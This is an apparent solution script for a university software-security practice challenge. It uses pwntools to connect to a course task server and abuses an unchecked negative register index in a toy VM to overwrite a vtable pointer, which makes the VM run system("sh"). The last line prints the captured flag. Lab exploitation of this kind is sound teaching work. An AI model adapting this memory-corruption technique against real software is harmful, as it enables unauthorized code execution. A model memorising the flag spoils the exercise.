from pwn import *
import string
from sys import argv
import os
import time
import sys
import subprocess

context.arch = 'amd64'
context.os = 'linux'
info = log.info
context.log_level = 'debug'

binfile = './vuln'
elf = context.binary = ELF(binfile)


# for debugging
gdbscript = '''
file /gdbscript/vuln
b vuln.cpp:20
b vuln.cpp:164
b vuln.cpp:181
'''.format(**locals())
with open("gdbscript", "w") as f:
    f.write(gdbscript)


# start remote
#p = remote('tasks.ws24.softsec.rub.de', 33251)

# host = "127.0.0.1"
# port = 1024
host = "tasks.ws24.softsec.rub.de"
port = 33275


p=remote(host, port)
#p2=process('tmux split-window -h docker exec -ti "$(docker ps -q -f \'ancestor=softsec/debug/practice-6\')" /bin/bash -c \'gdb -x /gdbscript/gdbscript -p "$(pgrep -n vuln)"\'', shell=True)
#sleep(2)
#p2.close()


def cyclic_find_bytes(b):
    to_be_found = bytes.fromhex(hex(b)[2:])[::-1]
    return cyclic_find(to_be_found)

# vuln:    swi instruction is system call
#          bounds check does not account for negative register indices
# attack:  set r-32982983 or whatever to vtable ptr for swi
#          overwrite vtable ptr of following instruction in memoryview
#          if that instruction is then executed, we gain system(???)
# problem: I can only overwrite things at smaller address than I myself am at


#    swi execute   -   set execute
#p/x 0x5608ae4c7778-0x5608ae4c7728
#$3 = 0x50
# => set r0, 0x50

#p (0x561ff8eca1e0-0x561ff8ecd4f0)/8
#$4 = -1634
# => add r-1634, r-1634, r0



# => set r-16750477, 0

p.sendline(b"set r0, 0x6873") # "sh"
p.sendline(b"set r1, 0x50")   # adjust vtable ptr to point onto swi execute for 4th instruction below
p.sendline(b"add r-22, r-22, r1") # ^
p.sendline(b"set r1, 0") # call system("sh")

p.sendline()

p.interactive()

#softsec{h86um9VYOOgQvqoxVjHkp_bJTapwAOf-_fQM-80P2afPq0-e7k5R3TbpuedfdcpW}